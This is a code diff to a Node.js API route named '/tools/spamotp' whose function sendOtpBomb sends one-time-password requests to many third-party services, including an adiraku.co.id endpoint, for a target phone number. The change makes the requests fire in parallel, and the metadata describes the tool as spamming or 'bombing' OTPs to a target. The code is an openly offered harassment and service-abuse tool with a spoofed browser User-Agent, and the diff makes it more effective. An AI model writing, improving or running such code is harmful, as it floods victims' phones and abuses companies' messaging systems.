@@ -1,4 +1,4 @@
-        const axios = require('axios');
+const axios = require('axios');
 
 async function sendOtpBomb(phone) {
     if (phone.startsWith("0")) phone = "62" + phone.slice(1);
@@ -27,10 +27,8 @@ async function sendOtpBomb(phone) {
         { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
     ];
 
-    let success = 0;
-    let failed = 0;
-
-    for (const ep of otpEndpoints) {
+    // Membuat array of promises untuk menembak semua API secara bersamaan (paralel)
+    const tasks = otpEndpoints.map(async (ep) => {
         try {
             const config = {
                 headers: { 
@@ -38,7 +36,7 @@ async function sendOtpBomb(phone) {
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 
                     ...(ep.headers || {}) 
                 },
-                timeout: 4000,
+                timeout: 4000, // Batas waktu tunggu per-API diturunkan jadi 4 detik demi keamanan jalur panel
                 validateStatus: () => true 
             };
             
@@ -50,11 +48,24 @@ async function sendOtpBomb(phone) {
             }
 
             if (res && res.status >= 200 && res.status < 300) {
-                success++;
-            } else {
-                failed++;
+                return true;
             }
+            return false;
         } catch {
+            return false;
+        }
+    });
+
+    // Menjalankan semua request secara serentak
+    const results = await Promise.allSettled(tasks);
+
+    let success = 0;
+    let failed = 0;
+
+    for (const result of results) {
+        if (result.status === "fulfilled" && result.value === true) {
+            success++;
+        } else {
             failed++;
         }
     }
@@ -68,13 +79,11 @@ async function sendOtpBomb(phone) {
 }
 
 module.exports = {
-    // Diubah ke 'all' agar mendukung request GET (lewat browser) dan POST (lewat bot/fetch)
     method: 'all', 
     path: '/tools/spamotp',
     isApikey: true,
     handler: async (req, res) => {
         try {
-            // Mengambil data dari segala jenis input request
             const phone = req.query?.phone || req.body?.phone;
             const q = req.query?.q || req.body?.q;
             const input = phone || q;
@@ -96,6 +105,7 @@ module.exports = {
                 });
             }
 
+            // Eksekusi fungsi paralel (hanya butuh waktu sekitar ~4 detik saja secara total)
             const result = await sendOtpBomb(cleanPhone);
 
             res.json({
@@ -119,7 +129,7 @@ module.exports = {
     },
     metadata: {
         category: "Tools",
-        description: "Spam / Bomb OTP ke nomor target menggunakan multi-endpoint API",
+        description: "Spam / Bomb OTP ke nomor target menggunakan multi-endpoint API secara serentak",
         isApikey: true,
         parameters: [
             {
